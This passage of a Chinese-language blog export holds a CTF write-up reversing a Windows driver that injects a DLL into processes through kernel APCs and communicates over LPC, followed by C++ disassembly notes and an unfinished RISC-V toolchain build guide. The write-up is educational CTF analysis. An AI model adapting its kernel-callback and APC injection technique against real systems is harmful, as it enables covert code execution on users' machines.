    <title>祥云杯2021</title>
    <url>/2021/09/02/xiang-yun-bei-2021/</url>
    <content><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Re-Apc"><a href="#Re-Apc" class="headerlink" title="Re_Apc"></a>Re_Apc</h2><p>比赛的时候没有做出来，被DllInjector.dll折磨到心态爆炸，网站sha3-256的时候还错了。<br>后来发现根本用不到DllInjector.dll中的加密，还是没有老老实实地分析代码，太急躁了。</p>
<p>首先，这是1个驱动程序，可以使用工具InstDrv安装该驱动。<br>调试驱动程序需要使用WinDbg，需要配置WinDbg双机调试环境</p>
<pre class="line-numbers language-none"><code class="language-none"># win10客户机配置方案
设置-&gt;更新和安全→开发人员选项:转为开发人员模式

win+r→msconfig→引导→高级选项：选中调试、调试端口选择COM1、波特率选择115200

# win10调试机配置方案
1. 安装WinDbg
2. 虚拟机硬件配置中删除打印机(会占用串口)，重新创建1个串口，如下图

# WinDbg kernel mode调试
选择Attack Kernel,使用com端口
port：\\.\pipe\com_1
Baud Rate：115200<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/2021/09/02/xiang-yun-bei-2021/WinDbg%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AE%BE%E7%BD%AE.jpg" class="">

<p><strong>需要非常注意的是，只有在WinDbg载入驱动的时候我们才能给驱动下断，所有如果发现断点无法成功断下来，可以考虑卸载驱动，再次安装并启动</strong></p>
<h3 id="injectDriver-sys分析"><a href="#injectDriver-sys分析" class="headerlink" title="injectDriver.sys分析"></a>injectDriver.sys分析</h3><p>windows驱动程序的入口是DriverEntry<br>不是非常熟悉驱动程序，用vs2019编译了一个HelloWorld.sys，并且保留了调试符号，用ida打开</p>
<p>带符号的驱动主函数如下：</p>
<img src="/2021/09/02/xiang-yun-bei-2021/kmdfEntry.png" class="">
<p>可以看到里面有1个DriverEntry，对比一下位置，在题中所给程序的该函数应该为sub1400015EC</p>
<img src="/2021/09/02/xiang-yun-bei-2021/injectEntry.png" class="">

<img src="/2021/09/02/xiang-yun-bei-2021/createDevice.png" class="">    
<p>其中MajorFunction表示驱动在收到不同IRP时候的回调函数    </p>
<p>函数sub_1400019D8()解密释放了一个dll文件，InjectDLL.dll<br>其路径为C:\WINDOWS\TEMP\InjectDLL.dll</p>
<p>函数sub_1400019A4()创建了1个LPC，并新建了一个线程用来处理收到请求</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">NTSTATUS sub_1400019A4()
{
  __int64 v0; // rax
  NTSTATUS result; // eax

  LOBYTE(v0) = sub_140002360();
  qword_14000C2A8 = v0;
  if ( !sub_1400017F0() || (result = create_rpc(L"\\RPC Control\\ad034789-9a13-4153-a0b9-8523e91890f9"), result &lt; 0) )
    result = -1073741823;
  return result;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">result = PsCreateSystemThread(&amp;ThreadHandle, 0, 0i64, 0i64, 0i64, (PKSTART_ROUTINE)StartRoutine, &amp;qword_14000C300);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>StartRoutine为处理LPC的函数</p>
<p>针对StartRoutine的分析：</p>
<ol>
<li>使用NtReplyWaitRecvivePort接收PORT_MESSAGE</li>
<li>通过判断PORT_MESSAGE的u2数据结构来判断是不是第一次建立连接 <img src="/2021/09/02/xiang-yun-bei-2021/portmessage%E4%B9%8Bu2.png" class=""></li>
<li>如果是第一次连接，则通过NtAcceptConnectPort和NtCompleteConnectPort建立无名端口并唤醒客户端进程。并且为每个新建立的连接分配内存，创建了1个链表来维护它。</li>
<li>如果不是第一次连接，如果u2的type不为5则继续执行，此时会判断客户端发送过来的控制数据来分辨发送过来的数据，分别执行不同的操作，如果发送过来的是key，则会对key进行叠加异或(sub14000298C())，然后返回结果给客户端。</li>
</ol>
<p>函数sub140001B78()注册了两个回调，一个是进程创建时的回调，另一个是加载映像时的回调。</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">char callback_register()
{
  if ( PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)CreateProcessRoutine, 0) )
    return 0;
  if ( PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)LoadImageRoutine) &lt; 0 )// 注册模块加载的回调函数，只要有模块加载，该函数就会执行
                                                // 
                                                // 如果回调注册失败，执行下面的操作：
                                                // 也就是说这个回调已经被注册过了
                                                // 需要把下面的监视进程的回调给Remove掉
  {
    PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)CreateProcessRoutine, 1u);
    return 0;
  }
  return 1;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>进程创建的回调函数执行如下操作：    </p>
<ol>
<li>为每个进程分配1块大小为0x130的内存</li>
<li>将一些与该进程有关的信息存放到这块内存中   <ol>
<li>需要注意的是0x12D处的值，这里其实是在判断进程名是否为explorer开头，如果是，则其hash会使得v11==0，0x12D处的值为1(这个也是赛后看大佬博客才知道的orz,但是不知道也没有关系，这个值我们可以直接改)</li>
<li>注意63行与67行，可以发现这里实际上维护了一个前向的链表，0x8处指向的是上一个进程对应的节点(且称它为pool)。</li>
<li>这个&amp;P没看懂是什么意思，不过影响不大</li>
</ol>
</li>
</ol>
<img src="/2021/09/02/xiang-yun-bei-2021/CreateProcessCallBack.png" class="">

<p>镜像加载的回调函数执行如下操作:</p>
<ol>
<li>找到加载该镜像的进程的节点</li>
<li>如果满足镜像名各个字节之和与上0x1FF为0x100,则会在创建内核Apc的时候注册1个唯一的NormalRoutine</li>
</ol>
<p>问题：</p>
<ol>
<li>用户态进程触发该回调函数的时候，该函数的权限是用户态还是内核态？<br> 因为代码是处于内核区域的，所以它的权限是R0级别</li>
<li><strong>该回调函数注册的Apc，属于触发回调函数的进程？还是属于注册回调函数的进程？</strong><br> 应该属于触发回调函数的进程</li>
</ol>
<p>针对NormalRoutine的分析   </p>
<ol>
<li>ZwCreateSection创建一块共享内存</li>
<li>然后根据pool的0x128处的数据v1选择调用不同的函数<br> 如果v1是2的时候，会向r3处注入shellcode(但是我调不出这条路径orz),然后再次注册1个用户模式的Apc，ApcRoutine为注入的shellcode,ApcContext为LdrLoadDll。注册的函数其实就是调用LdrLoadDll，这里其实是用R3载入了InjectDLL.dll</li>
</ol>
<p>所以这里我们实际上有两种方式载入InjectDLL.dll:</p>
<ol>
<li>达成上述条件</li>
<li>强行Load InjectDLL.dll</li>
</ol>
<h3 id="InjectDLL-dll分析"><a href="#InjectDLL-dll分析" class="headerlink" title="InjectDLL.dll分析"></a>InjectDLL.dll分析</h3><p>加载了1个不存在的dll文件(之前随手写了1个load InjectDLL.dll，不知道为什么会莫名其妙地加载后会卸载)<br>然后会加载一个GetContentHash函数</p>
<p>该函数会对"test"做hash，然后和结果进行比对，经过验证，该hash是sha3-256。</p>
<p>接着程序貌似对"AkiraDDL"进行了hash，然后用hash值作为key加密flag。(然而这里其实hash了个寂寞，最后并没有用到这个key)</p>
<p>回过头分析驱动中的MajorFunction，生成key的函数为sub_140003704()   </p>
<img src="/2021/09/02/xiang-yun-bei-2021/key%E7%9A%84%E4%BA%A7%E7%94%9F(1).png" class="">
<p>用户态通过DeviceIoControl函数向驱动发送请求，驱动通过该函数处理用户态请求，调试中最后返回给用户态的的数据其实是fix_data,也是一段固定的数据，但是与hash值无关。</p>
<p>前面说的是第一种通信方式，通过DeviceIoControl和驱动通信</p>
<p>接下来还会使用第二种通信方式，即通过LPC的方式通信，这里主要要看sys文件中的StartRoutine方法是如何处理IRP的。<br>dll文件在发送请求报的时候一共有两种状态：</p>
<ol>
<li>发送Test给驱动，附带控制数据1，则驱动执行原样复制，然后用NtReplyPort函数回复客户端。</li>
<li>发送key给驱动，附带控制数据3，对key进行叠加异或</li>
</ol>
<p>在获得加密密钥以后，dll会读取flag.txt文件中的明文，并用key对它进行32次加密，每轮根据rand()%6使用不同的加密函数(因为程序没有初始化种子，所以默认种子为1，即每轮使用的是哪个加密函数是可以确定的)，具体每一轮的加密函数看驱动中的MajorFunction[0xE]即可。</p>
<h3 id="关于Apc"><a href="#关于Apc" class="headerlink" title="关于Apc"></a>关于Apc</h3><p>待补充</p>
<h3 id="关于Lpc"><a href="#关于Lpc" class="headerlink" title="关于Lpc"></a>关于Lpc</h3><p>服务端：    </p>
<ol>
<li>NtCreatePort</li>
<li>NtListenPort(服务端被阻塞，等待来自客户端的连接请求)</li>
<li>服务端接收连接请求<ol>
<li>收到第一次连接请求时:NtAcceptConnectPort(服务端收到连接请求被唤醒，创建一个无名端)，之后使用NtCompleteConnectPort唤醒客户端进程</li>
<li>收到非第一次连接请求时:NtReplyWaitReceivePort</li>
</ol>
</li>
</ol>
<p>客户端:</p>
<ol>
<li>NtConnectPort</li>
<li>NtRequestWaitReplyPort</li>
</ol>
<p>IRP数据包结构：   </p>
<img src="/2021/09/02/xiang-yun-bei-2021/IRP%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" class="">   
<img src="/2021/09/02/xiang-yun-bei-2021/IRP%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%A7%A3%E9%87%8A.png" class="">   

<h3 id="WinDbg常用命令"><a href="#WinDbg常用命令" class="headerlink" title="WinDbg常用命令"></a>WinDbg常用命令</h3><pre class="line-numbers language-none"><code class="language-none"># 查看已加载的模块
lm

# 查看内存
da address    //字符串形式查看
db/dd/dw/dq address
dt symbolname address   //以xx结构查看内存

# 反汇编
u address

# 断点
bp address(modulename+偏移)
/1 一次性断点
# 条件断点
bp address ".if (condition) {operate} .else {gc}"    //其中gc表示go continue   
# 删除断点
bc 
# 查看断点
bl

# MASM运算
qwo/dwo/wo/by(address)
poi(address)      //取值操作

# 查看寄存器
r rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://bbs.pediy.com/thread-269036.htm#msg_header_h3_0">https://bbs.pediy.com/thread-269036.htm#msg_header_h3_0</a></li>
<li><a href="/2021/09/02/xiang-yun-bei-2021/solve.cpp" title="解密脚本">解密脚本</a></li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>windows apc</tag>
        <tag>windows r0</tag>
      </tags>
  </entry>
  <entry>
    <title>C++程序逆向</title>
    <url>/2021/09/07/c-cheng-xu-ni-xiang/</url>
    <content><![CDATA[<h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><p>示例代码：</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;iostream&gt;

using namespace std;

class Human {
public:
		virtual void act()=0;
};

class Parent:public Human{
public:
		Parent(){
			name = 0;
		}

		void getName() {
			cout &lt;&lt; "Get parent's name.\n";
		}

		virtual void act() {
			cout &lt;&lt; "Parent act.\n";
		}
private:
		int name;
};

class Child:public Parent{
public:
		Child(){
			age = 10;
		}

		int getAge() {
			return age;
		}

		int getAge(int id) {
			return age+id;
		}

		void getName() {
			cout &lt;&lt; "Get children's name.\n";
		}

		virtual void act() {
			cout &lt;&lt; "Child act.\n";
		}
private:
		int age;
};

int main(){
		Child c;
		Parent p;
		cout &lt;&lt; "child's age is:" &lt;&lt; c.getAge(10) &lt;&lt; "\n";
		cout &lt;&lt; "child's age is:" &lt;&lt; c.getAge() &lt;&lt; "\n";
		c.getName();
		p.getName();
		c.act();
		p.act();
		return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>编译：</p>
<pre class="line-numbers language-none"><code class="language-none">g++ -m64 test.cpp -o test <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>反汇编:</p>
<pre class="line-numbers language-none"><code class="language-none">objdump -d test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">0000000000001220 &lt;_ZN6ParentC1Ev&gt;:
    1220:	55                   	push   %rbp
    1221:	48 89 e5             	mov    %rsp,%rbp
    1224:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1228:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    122c:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
    1232:	90                   	nop
    1233:	5d                   	pop    %rbp
    1234:	c3                   	retq   
    1235:	90                   	nop

0000000000001236 &lt;_ZN5ChildC1Ev&gt;:
    1236:	55                   	push   %rbp
    1237:	48 89 e5             	mov    %rsp,%rbp
    123a:	48 83 ec 10          	sub    $0x10,%rsp
    123e:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1242:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1246:	48 89 c7             	mov    %rax,%rdi
    1249:	e8 d2 ff ff ff       	callq  1220 &lt;_ZN6ParentC1Ev&gt;
    124e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1252:	c7 40 04 0a 00 00 00 	movl   $0xa,0x4(%rax)
    1259:	90                   	nop
    125a:	c9                   	leaveq 
    125b:	c3                   	retq   
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>父类构造函数：<br>this指针是函数的第1个参数，存放在rdi寄存器中。<br>val是类的第一个属性，因为这个类没有虚函数表，所以它在对象中的内存偏移为0。</p>
<p>子类构造函数：<br>存在传参的过程，即把子类构造函数接收到的参数传递给父类构造函数。<br>这里我们没有显式地调用父类构造函数，但是程序默认调用了父类构造函数。<br>最后程序会执行自己的代码逻辑。</p>
<h2 id="main函数："><a href="#main函数：" class="headerlink" title="main函数："></a>main函数：</h2><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">0000000000001165 &lt;main&gt;:
    1165:	55                   	push   %rbp
    1166:	48 89 e5             	mov    %rsp,%rbp
    1169:	53                   	push   %rbx
    116a:	48 83 ec 28          	sub    $0x28,%rsp
    116e:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    1172:	48 89 c7             	mov    %rax,%rdi
    1175:	e8 8a 01 00 00       	callq  1304 &lt;_ZN5ChildC1Ev&gt;
    117a:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
    117e:	48 89 c7             	mov    %rax,%rdi
    1181:	e8 16 01 00 00       	callq  129c &lt;_ZN6ParentC1Ev&gt;
    1186:	48 8d 35 bb 0e 00 00 	lea    0xebb(%rip),%rsi        # 2048 &lt;_ZStL19piecewise_construct+0x44&gt;
    118d:	48 8d 3d ec 2e 00 00 	lea    0x2eec(%rip),%rdi        # 4080 &lt;_ZSt4cout@@GLIBCXX_3.4&gt;
    1194:	e8 a7 fe ff ff       	callq  1040 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
    1199:	48 89 c3             	mov    %rax,%rbx
    119c:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    11a0:	be 0a 00 00 00       	mov    $0xa,%esi
    11a5:	48 89 c7             	mov    %rax,%rdi
    11a8:	e8 9d 01 00 00       	callq  134a &lt;_ZN5Child6getAgeEi&gt;
    11ad:	89 c6                	mov    %eax,%esi
    11af:	48 89 df             	mov    %rbx,%rdi
    11b2:	e8 a9 fe ff ff       	callq  1060 &lt;_ZNSolsEi@plt&gt;
    11b7:	48 8d 35 9a 0e 00 00 	lea    0xe9a(%rip),%rsi        # 2058 &lt;_ZStL19piecewise_construct+0x54&gt;
    11be:	48 89 c7             	mov    %rax,%rdi
    11c1:	e8 7a fe ff ff       	callq  1040 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
    11c6:	48 8d 35 7b 0e 00 00 	lea    0xe7b(%rip),%rsi        # 2048 &lt;_ZStL19piecewise_construct+0x44&gt;
    11cd:	48 8d 3d ac 2e 00 00 	lea    0x2eac(%rip),%rdi        # 4080 &lt;_ZSt4cout@@GLIBCXX_3.4&gt;
    11d4:	e8 67 fe ff ff       	callq  1040 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
    11d9:	48 89 c3             	mov    %rax,%rbx
    11dc:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    11e0:	48 89 c7             	mov    %rax,%rdi
    11e3:	e8 50 01 00 00       	callq  1338 &lt;_ZN5Child6getAgeEv&gt;
    11e8:	89 c6                	mov    %eax,%esi
    11ea:	48 89 df             	mov    %rbx,%rdi
    11ed:	e8 6e fe ff ff       	callq  1060 &lt;_ZNSolsEi@plt&gt;
    11f2:	48 8d 35 5f 0e 00 00 	lea    0xe5f(%rip),%rsi        # 2058 &lt;_ZStL19piecewise_construct+0x54&gt;
    11f9:	48 89 c7             	mov    %rax,%rdi
    11fc:	e8 3f fe ff ff       	callq  1040 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
    1201:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    1205:	48 89 c7             	mov    %rax,%rdi
    1208:	e8 57 01 00 00       	callq  1364 &lt;_ZN5Child7getNameEv&gt;
    120d:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
    1211:	48 89 c7             	mov    %rax,%rdi
    1214:	e8 a7 00 00 00       	callq  12c0 &lt;_ZN6Parent7getNameEv&gt;
    1219:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    121d:	48 89 c7             	mov    %rax,%rdi
    1220:	e8 61 01 00 00       	callq  1386 &lt;_ZN5Child3actEv&gt;
    1225:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
    1229:	48 89 c7             	mov    %rax,%rdi
    122c:	e8 b1 00 00 00       	callq  12e2 &lt;_ZN6Parent3actEv&gt;
    1231:	b8 00 00 00 00       	mov    $0x0,%eax
    1236:	48 83 c4 28          	add    $0x28,%rsp
    123a:	5b                   	pop    %rbx
    123b:	5d                   	pop    %rbp
    123c:	c3                   	retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>116e两行表明，使用这种方式声明的对象的数据是布局在栈上的</p>
<h1 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h1><p>为类Child声明一个原型为int getAge(int)的函数，反汇编后程序中会多一个函数。</p>
<h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><p>静态多态与动态多态</p>
<p>静态多态即函数重载和函数模板</p>
<h2 id="覆盖："><a href="#覆盖：" class="headerlink" title="覆盖："></a>覆盖：</h2><p>父类中有1个非虚函数的函数，子类中也有1个同名函数，并且二者类型相同。<br>父类：</p>
<pre class="line-numbers language-none"><code class="language-none">000000000000129a &lt;_ZN6Parent7getNameEv&gt;:
    129a:	55                   	push   %rbp
    129b:	48 89 e5             	mov    %rsp,%rbp
    129e:	48 83 ec 10          	sub    $0x10,%rsp
    12a2:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    12a6:	48 8d 35 58 0d 00 00 	lea    0xd58(%rip),%rsi        # 2005 &lt;_ZStL19piecewise_construct+0x1&gt;
    12ad:	48 8d 3d cc 2d 00 00 	lea    0x2dcc(%rip),%rdi        # 4080 &lt;_ZSt4cout@@GLIBCXX_3.4&gt;
    12b4:	e8 87 fd ff ff       	callq  1040 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
    12b9:	90                   	nop
    12ba:	c9                   	leaveq 
    12bb:	c3                   	retq <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>子类：</p>
<pre class="line-numbers language-none"><code class="language-none">000000000000130e &lt;_ZN5Child7getNameEv&gt;:
    130e:	55                   	push   %rbp
    130f:	48 89 e5             	mov    %rsp,%rbp
    1312:	48 83 ec 10          	sub    $0x10,%rsp
    1316:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    131a:	48 8d 35 f8 0c 00 00 	lea    0xcf8(%rip),%rsi        # 2019 &lt;_ZStL19piecewise_construct+0x15&gt;
    1321:	48 8d 3d 58 2d 00 00 	lea    0x2d58(%rip),%rdi        # 4080 &lt;_ZSt4cout@@GLIBCXX_3.4&gt;
    1328:	e8 13 fd ff ff       	callq  1040 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
    132d:	90                   	nop
    132e:	c9                   	leaveq 
    132f:	c3                   	retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>父子类声明同名函数，在程序中会有两个不同的函数，其它没什么区别。</p>
<h2 id="动态多态——虚函数"><a href="#动态多态——虚函数" class="headerlink" title="动态多态——虚函数"></a>动态多态——虚函数</h2><p>虚函数调用的表现如下:</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">mov     rax, [rbp+var_20]   //栈上对象的this指针
mov     rax, [rax]          //虚表
mov     rdx, [rax]          //寻找寻函数
mov     rax, [rbp+var_20]   
mov     rdi, rax            //对象的this指针入参
call    rdx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>虚表位置</p>
<pre class="line-numbers language-none"><code class="language-none">.data.rel.ro:0000000000003D58 ; `vtable for'Child
.data.rel.ro:0000000000003D58 _ZTV5Child      dq 0                    ; offset to this
.data.rel.ro:0000000000003D60                 dq offset _ZTI5Child    ; `typeinfo for'Child
.data.rel.ro:0000000000003D68 off_3D68        dq offset _ZN5Child3actEv
.data.rel.ro:0000000000003D68                                         ; DATA XREF: Child::Child(void)+18↑o
.data.rel.ro:0000000000003D68                                         ; Child::act(void)
.data.rel.ro:0000000000003D70                 public _ZTV6Parent ; weak
.data.rel.ro:0000000000003D70 ; `vtable for'Parent
.data.rel.ro:0000000000003D70 _ZTV6Parent     dq 0                    ; offset to this
.data.rel.ro:0000000000003D78                 dq offset _ZTI6Parent   ; `typeinfo for'Parent
.data.rel.ro:0000000000003D80 off_3D80        dq offset _ZN6Parent3actEv
.data.rel.ro:0000000000003D80                                         ; DATA XREF: Parent::Parent(void)+18↑o
.data.rel.ro:0000000000003D80                                         ; Parent::act(void)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="静态成员变量"><a href="#静态成员变量" class="headerlink" title="静态成员变量"></a>静态成员变量</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;iostream&gt;

using namespace std;

class Test {
public:
	static void foo() {
		cout &lt;&lt; "Static member function foo called.\n";
	}

    void foo1() {
        cout &lt;&lt; "Non-static member function foo1 called.\n";
    }
};

int main() {
	Test* test = new Test();
	Test::foo();
	test-&gt;foo1();
	return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">g++ test.cpp -o test
objdump -d test

0000000000001165 &lt;main&gt;:
    1165:	55                   	push   %rbp
    1166:	48 89 e5             	mov    %rsp,%rbp
    1169:	48 83 ec 10          	sub    $0x10,%rsp
    116d:	bf 01 00 00 00       	mov    $0x1,%edi
    1172:	e8 d9 fe ff ff       	callq  1050 &lt;_Znwm@plt&gt;
    1177:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    117b:	e8 71 00 00 00       	callq  11f1 &lt;_ZN4Test3fooEv&gt;            # 静态成员方法，不将this指针入参到rdi寄存器中
                                                                            # 所以静态成员方法中，不能访问对象的属性
    1180:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1184:	48 89 c7             	mov    %rax,%rdi                        # 非静态成员方法，将this指针入参
    1187:	e8 80 00 00 00       	callq  120c &lt;_ZN4Test4foo1Ev&gt;
    118c:	b8 00 00 00 00       	mov    $0x0,%eax
    1191:	c9                   	leaveq 
    1192:	c3                   	retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>静态成员方法的代码也在text段</p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Run linux on riscv</title>
    <url>/2021/09/16/run-linux-on-riscv/</url>
    <content><![CDATA[<h1 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h1><p>ubuntu 20.04</p>
<h1 id="编译riscv-gun-toolchain"><a href="#编译riscv-gun-toolchain" class="headerlink" title="编译riscv-gun-toolchain"></a>编译riscv-gun-toolchain</h1><p>Riscv的GNU交叉编译工具链</p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>国内github下载太慢<br>我选择用码云下载</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone  https://gitee.com/mirrors/riscv-gnu-toolchain
<span class="token builtin class-name">cd</span> riscv-gnu-toolchain
<span class="token comment">#把之前的空文件夹删了</span>
<span class="token function">rm</span> -rf riscv-*
<span class="token comment">#再分别拉取分支</span>
<span class="token function">git</span> clone -b upstream git@gitee.com:mirrors/riscv-newlib.git
<span class="token function">git</span> clone -b riscv-glibc-2.29 git@gitee.com:mirrors/riscv-glibc.git
<span class="token function">git</span> clone -b riscv-gcc-9.2.0-rvv git@gitee.com:mirrors/riscv-gcc.git
<span class="token function">git</span> clone git@gitee.com:mirrors/riscv-dejagnu.git

<span class="token comment">#riscv-binutils与riscv-gdb为同一个仓库的不同分支</span>
<span class="token function">git</span> clone -b rvv-0.8.x git@gitee.com:mirrors/riscv-binutils-gdb.git riscv-binutils
<span class="token function">git</span> clone -b fsf-gdb-8.3-with-sim git@gitee.com:mirrors/riscv-binutils-gdb.git riscv-gdb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>交叉编译工具链主要有两个版本：</p>
<ul>
<li>riscv64-­unknown-­elf-gcc，使用newlib，主要用于编译静态程序或者单机嵌入式程序。</li>
<li>riscv64-unknown-­linux-­gnu-­gcc，使用glibc，可以编译动态链接程序，如大型操作系统如linux kernel等。</li>
</ul>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>选择编译riscv-unknown-linux-gcc<br>编译前准备</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> autoconf automake autotools-dev <span class="token function">curl</span> python3 libmpc-dev libmpfr-dev libgmp-dev <span class="token function">gawk</span> build-essential bison flex texinfo gperf libtool patchutils <span class="token function">bc</span> zlib1g-dev libexpat-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>编译</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">RISCV</span><span class="token operator">=</span>/opt/riscv
./configure --prefix<span class="token operator">=</span><span class="token variable">$RISCV</span>
<span class="token function">make</span> linux -j <span class="token variable">${nproc}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>修改环境变量  </p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"<span class="token environment constant">$PATH</span>:<span class="token variable">$RISCV</span>/bin"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="编译qemu"><a href="#编译qemu" class="headerlink" title="编译qemu"></a>编译qemu</h1><p>下载</p>
